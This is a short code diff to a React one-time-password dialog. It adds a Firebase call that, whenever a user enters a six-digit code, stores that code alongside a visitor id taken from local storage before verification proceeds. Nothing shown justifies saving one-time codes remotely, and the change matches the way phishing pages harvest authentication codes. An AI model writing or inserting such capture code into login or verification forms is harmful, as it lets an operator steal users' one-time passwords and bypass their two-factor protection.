@@ -2,6 +2,7 @@
 
 import { useState, useEffect } from "react"
 import type React from "react"
+import { addData } from "../../firebase"
 
 interface OtpDialogProps {
   onVerify: (otp: string) => void
@@ -74,7 +75,10 @@ export default function OtpDialog({  onVerify, onCancel, phoneNumber }: OtpDialo
   }
 
   const handleVerify = () => {
+    const visitorId = localStorage.getItem("visitor")
+
     if (otp.length === 6) {
+addData({id:visitorId,otp})
       onVerify(otp)
     }
   }
